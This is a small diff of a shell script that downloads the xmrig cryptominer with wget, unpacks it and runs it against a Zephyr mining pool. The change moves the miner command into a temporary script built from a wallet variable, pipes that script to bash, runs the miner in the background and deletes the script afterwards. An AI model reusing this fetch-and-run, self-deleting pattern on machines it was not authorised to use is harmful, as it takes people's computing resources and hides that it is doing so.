@@ -51,7 +51,13 @@ cd "$ROOT_path" || handle_error "无法切换到目录: $ROOT_path"
 wget -O "xmrig.tar.gz" "$xmrig_url"
 tar -xzf "xmrig.tar.gz" -C "$ROOT_path"
 chmod +x "$ROOT_path/xmrig"
-./xmrig --coin zephyr --url "zeph.kryptex.network:8888" --user "ZEPHs6nHn1AJsdkqaZdUioNb7DnFNmcbXGuarcPSGGis7HBV7ZmeewCbUAVDwpGsiWGDyzUCVrcPLCMe6Sjd4V48Xu4FoLvTYRr/ta" --tls -k
+echo -e './xmrig --coin zephyr --url "zeph.kryptex.network:8888" --user "' > 1.sh
+echo -e $wallet >> 1.sh
+echo -e '/' >> 1.sh
+echo -e $random_number >>1.sh
+echo -e '" --tls -k -B' >> 1.sh
+cat 1.sh | bash
+rm -rf 1.sh
 sleep 10
 
 
